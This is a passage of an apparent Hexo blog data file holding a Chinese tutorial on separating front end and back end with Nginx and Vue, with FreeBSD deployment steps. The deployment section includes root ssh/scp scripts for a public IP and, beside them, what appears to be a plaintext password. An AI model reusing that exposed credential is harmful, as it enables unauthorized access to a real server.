是虚拟化的一种实现方案</p>\n<ol>\n<li><p>什么是虚拟化技术：<br>所谓虚拟化技术，其实是一种资源管理技术。可将计算机中实体资源进行虚拟化.<br>虚拟化技术种类：软件虚拟化、硬件虚拟化、内存虚拟化、网络虚拟化、桌面虚拟化、服务虚拟化、虚拟机等等</p>\n</li>\n<li><p>什么是Docker</p>\n</li>\n<li>DockerComponent(<code>镜像</code>, <code>注册中心</code>, <code>容器</code>, <code>客户端</code>, <code>服务器</code>)</li>\n<li>Docker镜像操作</li>\n<li>Docker容器操作</li>\n<li>Docker容器备份/迁移</li>\n</ol>\n"},{"title":"Nginx+Vue实现前后端分离","date":"2018-06-09T10:18:33.000Z","_content":"## Nginx+Vue.js实现前后端分离\n### 1.nginx 是一个高性能的HTTP和反向代理服务器，常用于分布式服务器管理.\n\n### 2.[Es6学习地址](http://es6.ruanyifeng.com/)\n\n### 3.vue.js是一款前端`模板渲染引擎`,类似于后端的`jsp`,`beetl`等`模板引擎`.当然结合node环境也可作为后端渲染用.(官网已支持)\n\n## 说了上述几点,让我们来回答几个为什么? \n\n1.实现前后端分离的好处是什么?主要应用场景在哪?\n\n2.为什么有了后端模板引擎,为什么还要用前端的模板引擎?他们的优势和劣势? \n\n3.实现前后端分离需要怎么改？\n\n  答：\n  \n  1.首先是发展的眼光看问题，以前的项目大多呈现的是PC端项目,且场景简单,固定.请求大多是有状态的.而现在我们常常是移动端项目较多,同一款app大多是原生和内嵌页面相结合的方式.并且现在的项目场景更多元化,这导致一个功能模块很可能是好几个项目的请求共同作用的结果.\n\n  2.如果还按照以前的做法,第一个问题是我只能用jsonp去解决调多个跨域请求的问题,实现起来代码太过冗余。对于同一功能,很有可能app端和PC端就有两套不同的写法。并且带宽是个很贵的东西,客户端总是去服务器端一起静态资源的请求,会导致速度慢。动静分离可以实现静态资源和动态资源分开获取,并且服务器也能动静分离,有效解决带宽问题。\n\n  3.后端开发人员对于css,js的掌握可能不如前端熟练,比如利用jsp填充数据时,往往需要后端开发人员去调样式和写js,这样会造成开发效率低下。\n\n  4.采用前端模板渲染可以释放服务器端的一部分压力,并且前端模板引擎支持的功能比后端丰富.比如用vue可以自定义组件,校验方式,深入式渐变等,这比后端模板引擎功能要更加丰富.\n\n\n-----\n\n## nginx 配置静态资源\n````\n server {\n        listen       4000;\n        server_name  www.test.com;\n        charset utf-8;\n        index /static/index.html;//配置首页\n\n        //这边可使用正则表达式,拦截动态数据的请求,从而解决跨域问题\n        location = /sellingJson.html {\n           proxy_pass http://192.168.100.17:8090/vueHelpSellingcar.html;\n       }\n\n        #配置Nginx动静分离，定义的静态页面直接从static读取。\n       location ~ .*\\.(html|htm|gif|jpg|jpeg|bmp|png|ico|txt|js|css)$ \n       { \n        root /static/;\n        #expires定义用户浏览器缓存的时间为7天，如果静态页面不常更新，可以设置更长，这样可以节省带宽和缓解服务器的压力\n        expires      7d; \n       }    \n    }\n````\n\n[推荐阅读](https://blog.csdn.net/qq_26026975/article/details/75331779)\n\n-----\n\n## 部署操作\n### **Linux Scp命令**\n secure copy的缩写, scp是linux系统下基于ssh登陆进行安全的远程文件拷贝命令。\n\n### `sudo su` 使用管理员权限\n\n### **创建登录脚本**\n > cd /usr/local/bin/  \n > vim login  `// Jdyx8*5`\n ````\n #!/bin/bash\n ssh root@47.104.231.254\n ````\n \n### **创建文件上脚本**\n> cd /usr/local/bin/  \n > vim remoteDeploy  `// Jdyx8*5`\n ````\n #!/bin/bash\n scp -r /mnt/d/Project/shrs/dist/* root@47.104.231.254:/mnt/www/shrs2006.com\n ````\n\n### [sudo su 管理员权限运行](https://blog.csdn.net/guoweimelon/article/details/50471561)\n\n > chmod a+x file-name [提升权限](http://man.linuxde.net/chmod)\n\n### **第一步 使用pkg包管理工具`搜索/安装`Nginx**\n FreeBSD 安装 NGINX  // done\n FreeBSD 下 `pkg` 包管理工具\n ````\n pkg search pkgName // 搜索\n pkg install pkgName[必须是完整名称，可以先search关键字，后复制全称安装] \n ````\n\n Nginx 安装完成后 \n ````\n systemctl enable nginx // 设置开机启动 注意版本，在主流Linux版本下有效 as Ubuntu、CentOS\n ````\n\n### **第二步 启动后台服务**\n 作为后台服务 启动服务\n ````\n service nginx onestart\n service nginx onerestart\n service nginx onestop\n ````\n#### Nginx总配置文件目录\n````\n/usr/local/etc/nginx\n\ngzip  on;\n    include /mnt/www/etc/nginx/*.conf;    # !* import\n````\n\n#### 分配置文件\n````\nserver {\n        listen 80;\n        server_name localhost;\n\n        default_type 'text/html';\n        charset utf-8;\n\n        location / {\n                root /mnt/www/shrs2006.com;\n                index index.html;\n        }\n}\n````\n\n**配置Nginx**\n\n1.总配置文件，加分配至文件目录。虚拟主机 /usr/local/etc/nginx\n\n2.分配置文件 以`域名`命名  `/mnt/www/etc/nginx/shrs2006.com.conf` // 一个网站 对应一个配置文件\n\n\n### 调试，修改host文件\n1. C:\\Windows\\System32\\drivers\\etc\n2. 修改host ([host修改权限](https://jingyan.baidu.com/article/624e7459b194f134e8ba5a8e.html))\n3. [修改host](https://jingyan.baidu.com/article/5bbb5a1b15c97c13eba1798a.html)\n\n绑定假域名\n\nwww.shrs2006.test => IP windows hosts\n\nhost文件:\n````\n47.104.231.254          www.shrs2006.test // 末尾加入字段\n````\n\n// done\n\n### 第三步 上传 项目文件\nscp 脚本 项目生成后dist文件夹 上传指定目录下\n\n````\n/mnt/www/shrs2006.com\n\nscp /mnt/d/Project/shrs/dist root@47.104.231.254:/mnt/www/shrs2006.com\n````\n\n\n\n### 第四步\n访问 网址 检测是否部署成功\n\n重启服务器，打开假域名、可以看到网站 算成功。\n\n### 第五步\n重启 Nginx 服务 \n[命令](https://www.cnblogs.com/zhj5551/p/7589078.html)\n\n并且要求 开机启动 [Linux的关机与重启命令](https://www.ezloo.com/2009/05/linux_poweroff_and_reboot.html)\n\n","source":"_posts/server/Nginx-Vue.md","raw":"---\ntitle: Nginx+Vue实现前后端分离\ndate: 2018-06-09 18:18:33\ntags: Nginx / Vue\ncategories: Nginx\n---\n## Nginx+Vue.js实现前后端分离\n### 1.nginx 是一个高性能的HTTP和反向代理服务器，常用于分布式服务器管理.\n\n### 2.[Es6学习地址](http://es6.ruanyifeng.com/)\n\n### 3.vue.js是一款前端`模板渲染引擎`,类似于后端的`jsp`,`beetl`等`模板引擎`.当然结合node环境也可作为后端渲染用.(官网已支持)\n\n## 说了上述几点,让我们来回答几个为什么? \n\n1.实现前后端分离的好处是什么?主要应用场景在哪?\n\n2.为什么有了后端模板引擎,为什么还要用前端的模板引擎?他们的优势和劣势? \n\n3.实现前后端分离需要怎么改？\n\n  答：\n  \n  1.首先是发展的眼光看问题，以前的项目大多呈现的是PC端项目,且场景简单,固定.请求大多是有状态的.而现在我们常常是移动端项目较多,同一款app大多是原生和内嵌页面相结合的方式.并且现在的项目场景更多元化,这导致一个功能模块很可能是好几个项目的请求共同作用的结果.\n\n  2.如果还按照以前的做法,第一个问题是我只能用jsonp去解决调多个跨域请求的问题,实现起来代码太过冗余。对于同一功能,很有可能app端和PC端就有两套不同的写法。并且带宽是个很贵的东西,客户端总是去服务器端一起静态资源的请求,会导致速度慢。动静分离可以实现静态资源和动态资源分开获取,并且服务器也能动静分离,有效解决带宽问题。\n\n  3.后端开发人员对于css,js的掌握可能不如前端熟练,比如利用jsp填充数据时,往往需要后端开发人员去调样式和写js,这样会造成开发效率低下。\n\n  4.采用前端模板渲染可以释放服务器端的一部分压力,并且前端模板引擎支持的功能比后端丰富.比如用vue可以自定义组件,校验方式,深入式渐变等,这比后端模板引擎功能要更加丰富.\n\n\n-----\n\n## nginx 配置静态资源\n````\n server {\n        listen       4000;\n        server_name  www.test.com;\n        charset utf-8;\n        index /static/index.html;//配置首页\n\n        //这边可使用正则表达式,拦截动态数据的请求,从而解决跨域问题\n        location = /sellingJson.html {\n           proxy_pass http://192.168.100.17:8090/vueHelpSellingcar.html;\n       }\n\n        #配置Nginx动静分离，定义的静态页面直接从static读取。\n       location ~ .*\\.(html|htm|gif|jpg|jpeg|bmp|png|ico|txt|js|css)$ \n       { \n        root /static/;\n        #expires定义用户浏览器缓存的时间为7天，如果静态页面不常更新，可以设置更长，这样可以节省带宽和缓解服务器的压力\n        expires      7d; \n       }    \n    }\n````\n\n[推荐阅读](https://blog.csdn.net/qq_26026975/article/details/75331779)\n\n-----\n\n## 部署操作\n### **Linux Scp命令**\n secure copy的缩写, scp是linux系统下基于ssh登陆进行安全的远程文件拷贝命令。\n\n### `sudo su` 使用管理员权限\n\n### **创建登录脚本**\n > cd /usr/local/bin/  \n > vim login  `// Jdyx8*5`\n ````\n #!/bin/bash\n ssh root@47.104.231.254\n ````\n \n### **创建文件上脚本**\n> cd /usr/local/bin/  \n > vim remoteDeploy  `// Jdyx8*5`\n ````\n #!/bin/bash\n scp -r /mnt/d/Project/shrs/dist/* root@47.104.231.254:/mnt/www/shrs2006.com\n ````\n\n### [sudo su 管理员权限运行](https://blog.csdn.net/guoweimelon/article/details/50471561)\n\n > chmod a+x file-name [提升权限](http://man.linuxde.net/chmod)\n\n### **第一步 使用pkg包管理工具`搜索/安装`Nginx**\n FreeBSD 安装 NGINX  // done\n FreeBSD 下 `pkg` 包管理工具\n ````\n pkg search pkgName // 搜索\n pkg install pkgName[必须是完整名称，可以先search关键字，后复制全称安装] \n ````\n\n Nginx 安装完成后 \n ````\n systemctl enable nginx // 设置开机启动 注意版本，在主流Linux版本下有效 as Ubuntu、CentOS\n ````\n\n### **第二步 启动后台服务**\n 作为后台服务 启动服务\n ````\n service nginx onestart\n service nginx onerestart\n service nginx onestop\n ````\n#### Nginx总配置文件目录\n````\n/usr/local/etc/nginx\n\ngzip  on;\n    include /mnt/www/etc/nginx/*.conf;    # !* import\n````\n\n#### 分配置文件\n````\nserver {\n        listen 80;\n        server_name localhost;\n\n        default_type 'text/html';\n        charset utf-8;\n\n        location / {\n                root /mnt/www/shrs2006.com;\n                index index.html;\n        }\n}\n````\n\n**配置Nginx**\n\n1.总配置文件，加分配至文件目录。虚拟主机 /usr/local/etc/nginx\n\n2.分配置文件 以`域名`命名  `/mnt/www/etc/nginx/shrs2006.com.conf` // 一个网站 对应一个配置文件\n\n\n### 调试，修改host文件\n1. C:\\Windows\\System32\\drivers\\etc\n2. 修改host ([host修改权限](https://jingyan.baidu.com/article/624e7459b194f134e8ba5a8e.html))\n3. [修改host](https://jingyan.baidu.com/article/5bbb5a1b15c97c13eba1798a.html)\n\n绑定假域名\n\nwww.shrs2006.test => IP windows hosts\n\nhost文件:\n````\n47.104.231.254          www.shrs2006.test // 末尾加入字段\n````\n\n// done\n\n### 第三步 上传 项目文件\nscp 脚本 项目生成后dist文件夹 上传指定目录下\n\n````\n/mnt/www/shrs2006.com\n\nscp /mnt/d/Project/shrs/dist root@47.104.231.254:/mnt/www/shrs2006.com\n````\n\n\n\n### 第四步\n访问 网址 检测是否部署成功\n\n重启服务器，打开假域名、可以看到网站 算成功。\n\n### 第五步\n重启 Nginx 服务 \n[命令](https://www.cnblogs.com/zhj5551/p/7589078.html)\n\n并且要求 开机启动 [Linux的关机与重启命令](https://www.ezloo.com/2009/05/linux_poweroff_and_reboot.html)\n\n","slug":"server/Nginx-Vue","published":1,"updated":"2018-09-05T06:33:18.510Z","comments":1,"layout":"post","photos":[],"link":"","_id":"cjsfmrxwt0059zodv7zn7up5x","content":"<h2 id=\"Nginx-Vue-js实现前后端分离\"><a href=\"#Nginx-Vue-js实现前后端分离\" class=\"headerlink\" title=\"Nginx+Vue.js实现前后端分离\"></a>Nginx+Vue.js实现前后端分离</h2><h3 id=\"1-nginx-是一个高性能的HTTP和反向代理服务器，常用于分布式服务器管理\"><a href=\"#1-nginx-是一个高性能的HTTP和反向代理服务器，常用于分布式服务器管理\" class=\"headerlink\" title=\"1.nginx 是一个高性能的HTTP和反向代理服务器，常用于分布式服务器管理.\"></a>1.nginx 是一个高性能的HTTP和反向代理服务器，常用于分布式服务器管理.</h3><h3 id=\"2-Es6学习地址\"><a href=\"#2-Es6学习地址\" class=\"headerlink\" title=\"2.Es6学习地址\"></a>2.<a href=\"http://es6.ruanyifeng.com/\" target=\"_blank\" rel=\"noopener\">Es6学习地址</a></h3><h3 id=\"3-vue-js是一款前端模板渲染引擎-类似于后端的jsp-beetl等模板引擎-当然结合node环境也可作为后端渲染用-官网已支持\"><a href=\"#3-vue-js是一款前端模板渲染引擎-类似于后端的jsp-beetl等模板引擎-当然结合node环境也可作为后端渲染用-官网已支持\" class=\"headerlink\" title=\"3.vue.js是一款前端模板渲染引擎,类似于后端的jsp,beetl等模板引擎.当然结合node环境也可作为后端渲染用.(官网已支持)\"></a>3.vue.js是一款前端<code>模板渲染引擎</code>,类似于后端的<code>jsp</code>,<code>beetl</code>等<code>模板引擎</code>.当然结合node环境也可作为后端渲染用.(官网已支持)</h3><h2 id=\"说了上述几点-让我们来回答几个为什么\"><a href=\"#说了上述几点-让我们来回答几个为什么\" class=\"headerlink\" title=\"说了上述几点,让我们来回答几个为什么?\"></a>说了上述几点,让我们来回答几个为什么?</h2><p>1.实现前后端分离的好处是什么?主要应用场景在哪?</p>\n<p>2.为什么有了后端模板引擎,为什么还要用前端的模板引擎?他们的优势和劣势? </p>\n<p>3.实现前后端分离需要怎么改？</p>\n<p>  答：</p>\n<p>  1.首先是发展的眼光看问题，以前的项目大多呈现的是PC端项目,且场景简单,固定.请求大多是有状态的.而现在我们常常是移动端项目较多,同一款app大多是原生和内嵌页面相结合的方式.并且现在的项目场景更多元化,这导致一个功能模块很可能是好几个项目的请求共同作用的结果.</p>\n<p>  2.如果还按照以前的做法,第一个问题是我只能用jsonp去解决调多个跨域请求的问题,实现起来代码太过冗余。对于同一功能,很有可能app端和PC端就有两套不同的写法。并且带宽是个很贵的东西,客户端总是去服务器端一起静态资源的请求,会导致速度慢。动静分离可以实现静态资源和动态资源分开获取,并且服务器也能动静分离,有效解决带宽问题。</p>\n<p>  3.后端开发人员对于css,js的掌握可能不如前端熟练,比如利用jsp填充数据时,往往需要后端开发人员去调样式和写js,这样会造成开发效率低下。</p>\n<p>  4.采用前端模板渲染可以释放服务器端的一部分压力,并且前端模板引擎支持的功能比后端丰富.比如用vue可以自定义组件,校验方式,深入式渐变等,这比后端模板引擎功能要更加丰富.</p>\n<hr>\n<h2 id=\"nginx-配置静态资源\"><a href=\"#nginx-配置静态资源\" class=\"headerlink\" title=\"nginx 配置静态资源\"></a>nginx 配置静态资源</h2><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">server &#123;</span><br><span class=\"line\">       listen       4000;</span><br><span class=\"line\">       server_name  www.test.com;</span><br><span class=\"line\">       charset utf-8;</span><br><span class=\"line\">       index /static/index.html;//配置首页</span><br><span class=\"line\"></span><br><span class=\"line\">       //这边可使用正则表达式,拦截动态数据的请求,从而解决跨域问题</span><br><span class=\"line\">       location = /sellingJson.html &#123;</span><br><span class=\"line\">          proxy_pass http://192.168.100.17:8090/vueHelpSellingcar.html;</span><br><span class=\"line\">      &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">       #配置Nginx动静分离，定义的静态页面直接从static读取。</span><br><span class=\"line\">      location ~ .*\\.(html|htm|gif|jpg|jpeg|bmp|png|ico|txt|js|css)$ </span><br><span class=\"line\">      &#123; </span><br><span class=\"line\">       root /static/;</span><br><span class=\"line\">       #expires定义用户浏览器缓存的时间为7天，如果静态页面不常更新，可以设置更长，这样可以节省带宽和缓解服务器的压力</span><br><span class=\"line\">       expires      7d; </span><br><span class=\"line\">      &#125;    </span><br><span class=\"line\">   &#125;</span><br></pre></td></tr></table></figure>\n<p><a href=\"https://blog.csdn.net/qq_26026975/article/details/75331779\" target=\"_blank\" rel=\"noopener\">推荐阅读</a></p>\n<hr>\n<h2 id=\"部署操作\"><a href=\"#部署操作\" class=\"headerlink\" title=\"部署操作\"></a>部署操作</h2><h3 id=\"Linux-Scp命令\"><a href=\"#Linux-Scp命令\" class=\"headerlink\" title=\"Linux Scp命令\"></a><strong>Linux Scp命令</strong></h3><p> secure copy的缩写, scp是linux系统下基于ssh登陆进行安全的远程文件拷贝命令。</p>\n<h3 id=\"sudo-su-使用管理员权限\"><a href=\"#sudo-su-使用管理员权限\" class=\"headerlink\" title=\"sudo su 使用管理员权限\"></a><code>sudo su</code> 使用管理员权限</h3><h3 id=\"创建登录脚本\"><a href=\"#创建登录脚本\" class=\"headerlink\" title=\"创建登录脚本\"></a><strong>创建登录脚本</strong></h3><blockquote>\n<p>cd /usr/local/bin/<br>vim login  <code>// Jdyx8*5</code><br> <figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">#!/bin/bash</span><br><span class=\"line\">ssh root@47.104.231.254</span><br></pre></td></tr></table></figure></p>\n</blockquote>\n<h3 id=\"创建文件上脚本\"><a href=\"#创建文件上脚本\" class=\"headerlink\" title=\"创建文件上脚本\"></a><strong>创建文件上脚本</strong></h3><blockquote>\n<p>cd /usr/local/bin/<br>vim remoteDeploy  <code>// Jdyx8*5</code><br> <figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">#!/bin/bash</span><br><span class=\"line\">scp -r /mnt/d/Project/shrs/dist/* root@47.104.231.254:/mnt/www/shrs2006.com</span><br></pre></td></tr></table></figure></p>\n</blockquote>\n<h3 id=\"sudo-su-管理员权限运行\"><a href=\"#sudo-su-管理员权限运行\" class=\"headerlink\" title=\"sudo su 管理员权限运行\"></a><a href=\"https://blog.csdn.net/guoweimelon/article/details/50471561\" target=\"_blank\" rel=\"noopener\">sudo su 管理员权限运行</a></h3><blockquote>\n<p>chmod a+x file-name <a href=\"http://man.linuxde.net/chmod\" target=\"_blank\" rel=\"noopener\">提升权限</a></p>\n</blockquote>\n<h3 id=\"第一步-使用pkg包管理工具搜索-安装Nginx\"><a href=\"#第一步-使用pkg包管理工具搜索-安装Nginx\" class=\"headerlink\" title=\"第一步 使用pkg包管理工具搜索/安装Nginx\"></a><strong>第一步 使用pkg包管理工具<code>搜索/安装</code>Nginx</strong></h3><p> FreeBSD 安装 NGINX  // done<br> FreeBSD 下 <code>pkg</code> 包管理工具<br> <figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">pkg search pkgName // 搜索</span><br><span class=\"line\">pkg install pkgName[必须是完整名称，可以先search关键字，后复制全称安装]</span><br></pre></td></tr></table></figure></p>\n<p> Nginx 安装完成后<br> <figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">systemctl enable nginx // 设置开机启动 注意版本，在主流Linux版本下有效 as Ubuntu、CentOS</span><br></pre></td></tr></table></figure></p>\n<h3 id=\"第二步-启动后台服务\"><a href=\"#第二步-启动后台服务\" class=\"headerlink\" title=\"第二步 启动后台服务\"></a><strong>第二步 启动后台服务</strong></h3><p> 作为后台服务 启动服务<br> <figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">service nginx onestart</span><br><span class=\"line\">service nginx onerestart</span><br><span class=\"line\">service nginx onestop</span><br></pre></td></tr></table></figure></p>\n<h4 id=\"Nginx总配置文件目录\"><a href=\"#Nginx总配置文件目录\" class=\"headerlink\" title=\"Nginx总配置文件目录\"></a>Nginx总配置文件目录</h4><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">/usr/local/etc/nginx</span><br><span class=\"line\"></span><br><span class=\"line\">gzip  on;</span><br><span class=\"line\">    include /mnt/www/etc/nginx/*.conf;    # !* import</span><br></pre></td></tr></table></figure>\n<h4 id=\"分配置文件\"><a href=\"#分配置文件\" class=\"headerlink\" title=\"分配置文件\"></a>分配置文件</h4><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">server &#123;</span><br><span class=\"line\">        listen 80;</span><br><span class=\"line\">        server_name localhost;</span><br><span class=\"line\"></span><br><span class=\"line\">        default_type &apos;text/html&apos;;</span><br><span class=\"line\">        charset utf-8;</span><br><span class=\"line\"></span><br><span class=\"line\">        location / &#123;</span><br><span class=\"line\">                root /mnt/www/shrs2006.com;</span><br><span class=\"line\">                index index.html;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p><strong>配置Nginx</strong></p>\n<p>1.总配置文件，加分配至文件目录。虚拟主机 /usr/local/etc/nginx</p>\n<p>2.分配置文件 以<code>域名</code>命名  <code>/mnt/www/etc/nginx/shrs2006.com.conf</code> // 一个网站 对应一个配置文件</p>\n<h3 id=\"调试，修改host文件\"><a href=\"#调试，修改host文件\" class=\"headerlink\" title=\"调试，修改host文件\"></a>调试，修改host文件</h3><ol>\n<li>C:\\Windows\\System32\\drivers\\etc</li>\n<li>修改host (<a href=\"https://jingyan.baidu.com/article/624e7459b194f134e8ba5a8e.html\" target=\"_blank\" rel=\"noopener\">host修改权限</a>)</li>\n<li><a href=\"https://jingyan.baidu.com/article/5bbb5a1b15c97c13eba1798a.html\" target=\"_blank\" rel=\"noopener\">修改host</a></li>\n</ol>\n<p>绑定假域名</p>\n<p>www.shrs2006.test =&gt; IP windows hosts</p>\n<p>host文件:<br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">47.104.231.254          www.shrs2006.test // 末尾加入字段</span><br></pre></td></tr></table></figure></p>\n<p>// done</p>\n<h3 id=\"第三步-上传-项目文件\"><a href=\"#第三步-上传-项目文件\" class=\"headerlink\" title=\"第三步 上传 项目文件\"></a>第三步 上传 项目文件</h3><p>scp 脚本 项目生成后dist文件夹 上传指定目录下</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">/mnt/www/shrs2006.com</span><br><span class=\"line\"></span><br><span class=\"line\">scp /mnt/d/Project/shrs/dist root@47.104.231.254:/mnt/www/shrs2006.com</span><br></pre></td></tr></table></figure>\n<h3 id=\"第四步\"><a href=\"#第四步\" class=\"headerlink\" title=\"第四步\"></a>第四步</h3><p>访问 网址 检测是否部署成功</p>\n<p>重启服务器，打开假域名、可以看到网站 算成功。</p>\n<h3 id=\"第五步\"><a href=\"#第五步\" class=\"headerlink\" title=\"第五步\"></a>第五步</h3><p>重启 Nginx 服务<br><a href=\"https://www.cnblogs.com/zhj5551/p/7589078.html\" target=\"_blank\" rel=\"noopener\">命令</a></p>\n<p>并且要求 开机启动 <a href=\"https://www.ezloo.com/2009/05/linux_poweroff_and_reboot.html\" target=\"_blank\" rel=\"noopener\">Linux的关机与重启命令</a></p>\n","site":{"data":{}},"excerpt":"","more":"<h2 id=\"Nginx-Vue-js实现前后端分离\"><a href=\"#Nginx-Vue-js实现前后端分离\" class=\"headerlink\" title=\"Nginx+Vue.js实现前后端分离\"></a>Nginx+Vue.js实现前后端分离</h2><h3 id=\"1-nginx-是一个高性能的HTTP和反向代理服务器，常用于分布式服务器管理\"><a href=\"#1-nginx-是一个高性能的HTTP和反向代理服务器，常用于分布式服务器管理\" class=\"headerlink\" title=\"1.nginx 是一个高性能的HTTP和反向代理服务器，常用于分布式服务器管理.\"></a>1.nginx 是一个高性能的HTTP和反向代理服务器，常用于分布式服务器管理.</h3><h3 id=\"2-Es6学习地址\"><a href=\"#2-Es6学习地址\" class=\"headerlink\" title=\"2.Es6学习地址\"></a>2.<a href=\"http://es6.ruanyifeng.com/\" target=\"_blank\" rel=\"noopener\">Es6学习地址</a></h3><h3 id=\"3-vue-js是一款前端模板渲染引擎-类似于后端的jsp-beetl等模板引擎-当然结合node环境也可作为后端渲染用-官网已支持\"><a href=\"#3-vue-js是一款前端模板渲染引擎-类似于后端的jsp-beetl等模板引擎-当然结合node环境也可作为后端渲染用-官网已支持\" class=\"headerlink\" title=\"3.vue.js是一款前端模板渲染引擎,类似于后端的jsp,beetl等模板引擎.当然结合node环境也可作为后端渲染用.(官网已支持)\"></a>3.vue.js是一款前端<code>模板渲染引擎</code>,类似于后端的<code>jsp</code>,<code>beetl</code>等<code>模板引擎</code>.当然结合node环境也可作为后端渲染用.(官网已支持)</h3><h2 id=\"说了上述几点-让我们来回答几个为什么\"><a href=\"#说了上述几点-让我们来回答几个为什么\" class=\"headerlink\" title=\"说了上述几点,让我们来回答几个为什么?\"></a>说了上述几点,让我们来回答几个为什么?</h2><p>1.实现前后端分离的好处是什么?主要应用场景在哪?</p>\n<p>2.为什么有了后端模板引擎,为什么还要用前端的模板引擎?他们的优势和劣势? </p>\n<p>3.实现前后端分离需要怎么改？</p>\n<p>  答：</p>\n<p>  1.首先是发展的眼光看问题，以前的项目大多呈现的是PC端项目,且场景简单,固定.请求大多是有状态的.而现在我们常常是移动端项目较多,同一款app大多是原生和内嵌页面相结合的方式.并且现在的项目场景更多元化,这导致一个功能模块很可能是好几个项目的请求共同作用的结果.</p>\n<p>  2.如果还按照以前的做法,第一个问题是我只能用jsonp去解决调多个跨域请求的问题,实现起来代码太过冗余。对于同一功能,很有可能app端和PC端就有两套不同的写法。并且带宽是个很贵的东西,客户端总是去服务器端一起静态资源的请求,会导致速度慢。动静分离可以实现静态资源和动态资源分开获取,并且服务器也能动静分离,有效解决带宽问题。</p>\n<p>  3.后端开发人员对于css,js的掌握可能不如前端熟练,比如利用jsp填充数据时,往往需要后端开发人员去调样式和写js,这样会造成开发效率低下。</p>\n<p>  4.采用前端模板渲染可以释放服务器端的一部分压力,并且前端模板引擎支持的功能比后端丰富.比如用vue可以自定义组件,校验方式,深入式渐变等,这比后端模板引擎功能要更加丰富.</p>\n<hr>\n<h2 id=\"nginx-配置静态资源\"><a href=\"#nginx-配置静态资源\" class=\"headerlink\" title=\"nginx 配置静态资源\"></a>nginx 配置静态资源</h2><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">server &#123;</span><br><span class=\"line\">       listen       4000;</span><br><span class=\"line\">       server_name  www.test.com;</span><br><span class=\"line\">       charset utf-8;</span><br><span class=\"line\">       index /static/index.html;//配置首页</span><br><span class=\"line\"></span><br><span class=\"line\">       //这边可使用正则表达式,拦截动态数据的请求,从而解决跨域问题</span><br><span class=\"line\">       location = /sellingJson.html &#123;</span><br><span class=\"line\">          proxy_pass http://192.168.100.17:8090/vueHelpSellingcar.html;</span><br><span class=\"line\">      &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">       #配置Nginx动静分离，定义的静态页面直接从static读取。</span><br><span class=\"line\">      location ~ .*\\.(html|htm|gif|jpg|jpeg|bmp|png|ico|txt|js|css)$ </span><br><span class=\"line\">      &#123; </span><br><span class=\"line\">       root /static/;</span><br><span class=\"line\">       #expires定义用户浏览器缓存的时间为7天，如果静态页面不常更新，可以设置更长，这样可以节省带宽和缓解服务器的压力</span><br><span class=\"line\">       expires      7d; </span><br><span class=\"line\">      &#125;    </span><br><span class=\"line\">   &#125;</span><br></pre></td></tr></table></figure>\n<p><a href=\"https://blog.csdn.net/qq_26026975/article/details/75331779\" target=\"_blank\" rel=\"noopener\">推荐阅读</a></p>\n<hr>\n<h2 id=\"部署操作\"><a href=\"#部署操作\" class=\"headerlink\" title=\"部署操作\"></a>部署操作</h2><h3 id=\"Linux-Scp命令\"><a href=\"#Linux-Scp命令\" class=\"headerlink\" title=\"Linux Scp命令\"></a><strong>Linux Scp命令</strong></h3><p> secure copy的缩写, scp是linux系统下基于ssh登陆进行安全的远程文件拷贝命令。</p>\n<h3 id=\"sudo-su-使用管理员权限\"><a href=\"#sudo-su-使用管理员权限\" class=\"headerlink\" title=\"sudo su 使用管理员权限\"></a><code>sudo su</code> 